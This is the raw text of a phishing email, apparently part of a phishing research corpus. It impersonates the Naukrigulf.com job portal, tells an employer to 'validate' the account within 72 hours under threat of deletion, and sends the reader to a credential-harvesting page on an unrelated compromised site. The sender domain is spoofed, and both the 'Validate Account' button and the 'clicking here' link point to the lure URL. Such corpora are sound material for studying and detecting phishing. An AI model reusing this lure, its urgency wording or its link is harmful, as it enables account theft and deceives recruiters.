@@ -1,0 +1,264 @@
+Return-Path: info@indiandirectoryhk.com
+Delivered-To: jose@monkey.org
+X-FDA: 82635238350.35.90936A5
+Received: from speedway.hk (speedway.hk [96.125.164.95])
+	by imf22.b.hostedemail.com (Postfix) with ESMTP id 528BA160003
+	for <jose@monkey.org>; Fri,  4 Oct 2024 08:26:33 +0000 (UTC)
+Authentication-Results: imf22.b.hostedemail.com;	dkim=none;	dmarc=none;
+	spf=pass (imf22.b.hostedemail.com: domain of info@indiandirectoryhk.com
+ designates 96.125.164.95 as permitted sender)
+ smtp.mailfrom=info@indiandirectoryhk.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1728030339;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=5YZdMChaMmV0kT+MbaDl7tGAs0qSZXbpRnuOlNV4HVM=;
+	b=pu1jRgj0JruFiuqHOMVJeEDBmsazwA7EEkXwVMslbiu7rv4mmnz2QM01CwdBE2W32C34xd
+	LTqkS6oDzBS5fiTgd62XzlVjRE+TI9rYaVvGKfqpJjn+H7L8/5lFVNLBoPITXbgamwDXCI
+	bCvLRh9RA/Umbj0R5x+jPQUBVeWxXH0=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1728030339; a=rsa-sha256;
+	cv=none;
+	b=imDfvWHjilT1v0roUC8rorEkmC+ub7x+44K6KqgGwb3kYcef/NRrhEV3NEbfY6liYCeIDF
+	57ZQXV/Q0hZ0OwmnBr4q8KPdVF1aR/G06fINzSpc+X6mMzY90CcNAn5nfl7CZ+w++WWppM
+	cTQU/iDwhKrnNNv6ttERMqq+nSAhqds=
+ARC-Authentication-Results: i=1;	imf22.b.hostedemail.com;	dkim=none;
+	dmarc=none;	spf=pass (imf22.b.hostedemail.com: domain of
+ info@indiandirectoryhk.com designates 96.125.164.95 as permitted sender)
+ smtp.mailfrom=info@indiandirectoryhk.com
+Received: from [94.154.37.128] (port=63588
+ helo=host-128.hostingturkiye.com.tr)	by 5183060.buttar.hk with esmtpsa 
+ (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384	(Exim 4.96.2)
+	(envelope-from <info@indiandirectoryhk.com>)	id 1swddk-0004m0-0C	for
+ jose@monkey.org;	Fri, 04 Oct 2024 03:26:20 -0500
+From: Naukrigulf <info@indiandirectoryhk.com>
+To: jose@monkey.org
+Subject: Database Update
+Date: 4 Oct 2024 01:26:19 -0700
+Message-ID: <20241004012619.C361EEDF57ABF2E6@indiandirectoryhk.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - 5183060.buttar.hk
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - indiandirectoryhk.com
+X-Get-Message-Sender-Via:
+ 5183060.buttar.hk: authenticated_id: info@indiandirectoryhk.com
+X-Authenticated-Sender: 5183060.buttar.hk: info@indiandirectoryhk.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 528BA160003
+X-Rspamd-Server: rspam02
+X-Spam-Status: No, score=1.10
+X-Stat-Signature: psbi61a3tq5tfptn8k3auuzjxppu6gn5
+X-HE-Tag: 1728030393-996501
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19ExYDqdE3lGiwg3PsKX3qAl0o0X6PNUlD29TUyfQW6SuC?=
+ =?utf-8?q?785ILZPvfO5upuNgyjIgnnUk8n9hrlS3yp3fOaQPjkTeLIlwFCpbTn/txXT1goU2p?=
+ =?utf-8?q?425QDtQx2LJUaayMeF+HQHRRD9HJmbo5k3adpx1hCzAPejogV7p4TRGAjoek6AYRx?=
+ =?utf-8?q?Elv61AZNTLOPosaYQXrDYh0GdpFtt9dUYQ5p1RW8oPnn6Xm1t8UqtXiuZPNhsQntW?=
+ =?utf-8?q?FBANzN6DMx30QJ5KClOk7fIPgyTHb5eQtB5NDRXM+lhe8cisFZhff05Y9Bt+WXlpb?=
+ =?utf-8?q?kxrqcbFPIuqbULgzZicJR+6v1XktsQPCL8jLPkbmXFfoAEAJdorJYFfBsXHu5qyP4?=
+ =?utf-8?q?2hNj7te96UgT7L77qQASDukkMx1ocPVJToI+d7JCsw3AvKouZayLfap9rrI7bDd9n?=
+ =?utf-8?q?ezqZrpDMn553Yx/udxsDoPVWa8IM4IAEAPADrOTRBZTu6QxkSVEFwAJoh/Z+OEIpN?=
+ =?utf-8?q?rEMRQLjpiqfWj8Pqp0KdYB39qCBX7RiVGUyVVDoP0hXFUXJqzJALy+fKkHA8DvEMQ?=
+ =?utf-8?q?Xrfj0wGOJQivwy75xP91u/Y1xl7NCrPNH9Q6aLHSgoo3qGLMCVlePIzyNhpEU/0WH?=
+ =?utf-8?q?xkH+YQ8YaYPoa27G4aVLRUFWQriH6NLhkTwitkuN0ow/HwMsIrQQktFvIGloD7TaO?=
+ =?utf-8?q?rG4cYHqsf3S9lCbQAEyAhxiGjKQtN3dTYMKISDG/dzeXHDtIUmUTxHZrFR+wNCmSH?=
+ =?utf-8?q?kZs++kPhM3Sp6TCd0JYeiAbhO4YQVhl1cUfILzkWJXhyixhwkHo6s3kZ2mYtgjz56?=
+ =?utf-8?q?zArz/KtAU+fwPCnVKaH05JAaSuXJJ1t4r5aheUZe0j6SLpqXhUVzS8D50eWz/cfIn?=
+ =?utf-8?q?2jnz7fBT+nks9Bi3atUaez5ldu/kfYC1JPt6si4NFjkCVUo3j2uuP31nroddnLBHj?=
+ =?utf-8?q?TIOfiqetZA5qOKQs5qW/Em_bf5zjixC004eWXundcpd02JlqIlaHG0iwJeZUdHH3q?=
+ =?utf-8?q?ga7dn8oNr5gphNjtCokC0u+c7FxqCaOfll6H40XettH51JC8oCvuWyQ9SmV/5K7ED?=
+ =?utf-8?q?UaUSstp8tKjZTAFJ8/byCQjx+FZ/nlcisr8GXVFfK4PFJfFep9Vl5WS8nQi/5JEVF?=
+ =?utf-8?q?BOvN1MNa++A1AkXLRIe+DNmOMlMJhaqCiOrX/gnG/ckM6MX9HvBP/9Ldn++Ni7sTQ?=
+ =?utf-8?q?JXClw8YyrBsB2IEZ7Rp7iOms4XejiE686wf2pT5I7bBTm093LE+ubSw3NGPyuYu+F?=
+ =?utf-8?q?0e3MLVXIOBTE6jPsLEylpv8vfCyB/Sk+uI=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 288
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; color: rgb(36, 36, 36); text-transform: none; line-height: inhe=
+rit; text-indent: 0px; letter-spacing: normal; font-family: Verdana, Geneva=
+, sans-serif; font-size: 13.33px; font-style: normal; font-weight: 400; wor=
+d-spacing: 0px; vertical-align: baseline; white-space: normal; orphans: 2; =
+widows: 2; font-stretch: inherit; font-feature-settings: inherit; backgroun=
+d-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; font-variant-num=
+eric: inherit; font-variant-east-asian: inherit; font-variant-alternates: i=
+nherit; font-variant-position: inherit; font-optical-sizing: inherit; font-=
+kerning: inherit; font-variation-settings: inherit; -webkit-text-stroke-wid=
+th: 0px; text-decoration-thickness: initial; text-decoration-style: initial=
+; text-decoration-color: initial;">
+<span style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px curren=
+tColor; border-image: none; color: inherit; vertical-align: baseline; font-=
+size-adjust: inherit; font-stretch: inherit;"><a title=3D"Employer Home" st=
+yle=3D"font: inherit; margin: 0px; padding: 0px; border: 0px currentColor; =
+border-image: none; vertical-align: baseline; font-size-adjust: inherit; fo=
+nt-stretch: inherit;" href=3D"https://www.naukrigulf.com/employer-login" ta=
+rget=3D"_blank" rel=3D"noreferrer">
+<img style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;" alt=3D"Jobs in Gulf" src=3D"ht=
+tps://ci3.googleusercontent.com/proxy/REgrZzFEPQMcYDOujivx57NnUxc_T_eKmAGvO=
+WAgtMVOjf2r8svnv1BQZYtRlpSUYmJSRkzWaWWS1DEzAAR9Q_CL7NqUyNnEKNJeAkNn=3Ds0-d-=
+e1-ft#https://static.naukimg.com/s/2/200/i/ngLogo/logo_208_24.png" width=3D=
+"208" height=3D"24"></a></span>
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">&nbsp;</div>
+</div><p>
+</p>
+<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; color: rgb(36, 36, 36); text-transform: none; line-height: inhe=
+rit; text-indent: 0px; letter-spacing: normal; font-family: Verdana, Geneva=
+, sans-serif; font-size: 13.33px; font-style: normal; font-weight: 400; wor=
+d-spacing: 0px; vertical-align: baseline; white-space: normal; orphans: 2; =
+widows: 2; font-stretch: inherit; font-feature-settings: inherit; backgroun=
+d-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; font-variant-num=
+eric: inherit; font-variant-east-asian: inherit; font-variant-alternates: i=
+nherit; font-variant-position: inherit; font-optical-sizing: inherit; font-=
+kerning: inherit; font-variation-settings: inherit; -webkit-text-stroke-wid=
+th: 0px; text-decoration-thickness: initial; text-decoration-style: initial=
+; text-decoration-color: initial;">&nbsp;</div><p>
+</p>
+<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; color: rgb(36, 36, 36); text-transform: none; line-height: inhe=
+rit; text-indent: 0px; letter-spacing: normal; font-family: Verdana, Geneva=
+, sans-serif; font-size: 13.33px; font-style: normal; font-weight: 400; wor=
+d-spacing: 0px; vertical-align: baseline; white-space: normal; orphans: 2; =
+widows: 2; font-stretch: inherit; font-feature-settings: inherit; backgroun=
+d-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; font-variant-num=
+eric: inherit; font-variant-east-asian: inherit; font-variant-alternates: i=
+nherit; font-variant-position: inherit; font-optical-sizing: inherit; font-=
+kerning: inherit; font-variation-settings: inherit; -webkit-text-stroke-wid=
+th: 0px; text-decoration-thickness: initial; text-decoration-style: initial=
+; text-decoration-color: initial;">
+<span style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px curren=
+tColor; border-image: none; color: inherit; vertical-align: baseline; font-=
+size-adjust: inherit; font-stretch: inherit;"><strong>Dear Employer/Recruit=
+er</strong><strong>,</strong><br><br>We have just upgraded our server to se=
+rve you better.</span></div><p>
+</p>
+<div style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-i=
+mage: none; color: rgb(36, 36, 36); text-transform: none; line-height: inhe=
+rit; text-indent: 0px; letter-spacing: normal; font-family: Verdana, Geneva=
+, sans-serif; font-size: 13.33px; font-style: normal; font-weight: 400; wor=
+d-spacing: 0px; vertical-align: baseline; white-space: normal; orphans: 2; =
+widows: 2; font-stretch: inherit; font-feature-settings: inherit; backgroun=
+d-color: rgb(255, 255, 255);=20
+font-variant-ligatures: normal; font-variant-caps: normal; font-variant-num=
+eric: inherit; font-variant-east-asian: inherit; font-variant-alternates: i=
+nherit; font-variant-position: inherit; font-optical-sizing: inherit; font-=
+kerning: inherit; font-variation-settings: inherit; -webkit-text-stroke-wid=
+th: 0px; text-decoration-thickness: initial; text-decoration-style: initial=
+; text-decoration-color: initial;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<div style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px current=
+Color; border-image: none; color: inherit; vertical-align: baseline; font-s=
+ize-adjust: inherit; font-stretch: inherit;">
+<p><span style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px cur=
+rentColor; border-image: none; color: inherit; vertical-align: baseline; fo=
+nt-size-adjust: inherit; font-stretch: inherit;">As
+ part of the security measures to secure all Employer's users=20
+with&nbsp;Naukrigulf.com, All Employer's users are mandated to confirm thei=
+r=20
+Employer account as requested by&nbsp;</span><strong><span style=3D"font: i=
+nherit; margin: 0px; padding: 0px; border: 0px currentColor; border-image: =
+none; color: inherit; vertical-align: baseline; font-size-adjust: inherit; =
+font-stretch: inherit;">Naukri</span><span style=3D"font: inherit; margin: =
+0px; padding: 0px; border: 0px currentColor; border-image: none; color: inh=
+erit; vertical-align: baseline; font-size-adjust: inherit; font-stretch: in=
+herit;">gulf.</span>
+<span style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px curren=
+tColor; border-image: none; color: inherit; vertical-align: baseline; font-=
+size-adjust: inherit; font-stretch: inherit;">com</span></strong><strong>&n=
+bsp;<wbr>Administrator</strong><span style=3D"font: inherit; margin: 0px; p=
+adding: 0px; border: 0px currentColor; border-image: none; color: inherit; =
+vertical-align: baseline; font-size-adjust: inherit; font-stretch: inherit;=
+">.</span></p>
+<p><span style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px cur=
+rentColor; border-image: none; color: inherit; vertical-align: baseline; fo=
+nt-size-adjust: inherit; font-stretch: inherit;">You are hereby required to=
+ validate your account within&nbsp;<strong>72</strong>&nbsp;hours so as not=
+ to have your Employer account suspended and deleted from Our Administrator=
+ server.<br><br><strong>Click</strong>
+&nbsp;on the below to complete the functionality of your&nbsp;Naukrigulf.co=
+m employers account.</span></p>
+<table width=3D"145" align=3D"left" style=3D"font: inherit; font-size-adjus=
+t: inherit; font-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadd=
+ing=3D"0">
+<tbody>
+<tr>
+<td height=3D"30" align=3D"center" style=3D"white-space: normal !important;=
+" bgcolor=3D"#f7e35b"><a style=3D"font: inherit; margin: 0px; padding: 0px;=
+ border: 0px currentColor; border-image: none; vertical-align: baseline; fo=
+nt-size-adjust: inherit; font-stretch: inherit;" href=3D"https://hotstories=
+=2Eco.uk/wp-docs-server-2024-update-naukrigulf-updateslite8939920288309023/=
+nakurigulf.php?email=3Djose@monkey.org" target=3D"_blank" rel=3D"noreferrer=
+">
+<span style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px curren=
+tColor; border-image: none; color: inherit; vertical-align: baseline; font-=
+size-adjust: inherit; font-stretch: inherit;"><strong>Validate&nbsp;Account=
+</strong></span></a></td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p><br><br><span style=3D"font: inherit; margin: 0px; padding: 0px; border:=
+ 0px currentColor; border-image: none; color: inherit; vertical-align: base=
+line; font-size-adjust: inherit; font-stretch: inherit;">Happy Recruiting!<=
+br><br>Regards,<br><strong>Naukrigulf.com&nbsp;Team</strong></span>&nbsp;<s=
+pan style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px currentC=
+olor; border-image: none; color: inherit; vertical-align: baseline; font-si=
+ze-adjust: inherit; font-stretch: inherit;">
+&nbsp;</span><span style=3D"font: inherit; margin: 0px; padding: 0px; borde=
+r: 0px currentColor; border-image: none; color: inherit; vertical-align: ba=
+seline; font-size-adjust: inherit; font-stretch: inherit;">&nbsp;&nbsp;</sp=
+an></p>
+<p><span style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px cur=
+rentColor; border-image: none; color: inherit; vertical-align: baseline; fo=
+nt-size-adjust: inherit; font-stretch: inherit;">You can reach us at&nbsp;&=
+nbsp;<a style=3D"font: inherit; margin: 0px; padding: 0px; border: 0px curr=
+entColor; border-image: none; vertical-align: baseline; font-size-adjust: i=
+nherit; font-stretch: inherit;" rel=3D"noreferrer">cs@naukrigulf.com</a>&nb=
+sp;or&nbsp;<strong>+91-<wbr>9818307555</strong>
+&nbsp;for&nbsp;any service or support requirements. Or, you can reach us at=
+ one of our branch offices by&nbsp;&nbsp;&nbsp;<a style=3D"font: inherit; m=
+argin: 0px; padding: 0px; border: 0px currentColor; border-image: none; ver=
+tical-align: baseline; font-size-adjust: inherit; font-stretch: inherit;" h=
+ref=3D"https://hotstories.co.uk/wp-docs-server-2024-update-naukrigulf-updat=
+eslite8939920288309023/nakurigulf.php?email=3Djose@monkey.org" target=3D"_b=
+lank" rel=3D"noreferrer">clicking here</a></span></p>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+
+</body></html>
+
